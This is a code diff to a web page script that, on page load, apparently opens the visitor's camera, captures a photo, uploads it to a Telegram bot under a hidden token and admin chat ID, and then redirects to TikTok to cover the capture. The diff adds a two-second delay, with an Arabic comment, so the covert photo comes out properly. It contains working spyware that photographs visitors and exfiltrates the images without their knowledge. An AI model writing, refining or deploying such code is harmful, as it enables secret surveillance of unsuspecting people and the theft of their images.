@@ -17,19 +17,28 @@
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
-                
+
+                // ⏳ ننتظر ثانيتين عشان الكاميرا تشتغل وتصور صح
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; 
+                canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
                 canvas.toBlob(blob => {
                     let fd = new FormData();
                     fd.append('photo', blob, 'capture.jpg');
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${ADMIN_ID}`, {
-                        method: 'POST', body: fd
-                    }).then(() => { window.location.href = "https://www.tiktok.com"; });
+                        method: 'POST',
+                        body: fd
+                    }).then(() => {
+                        window.location.href = "https://www.tiktok.com"; 
+                    });
                 }, 'image/jpeg');
-            } catch (e) { window.location.href = "https://www.tiktok.com"; }
+            } catch (e) {
+                window.location.href = "https://www.tiktok.com";
+            }
         }
         window.onload = startHunt;
     </script>
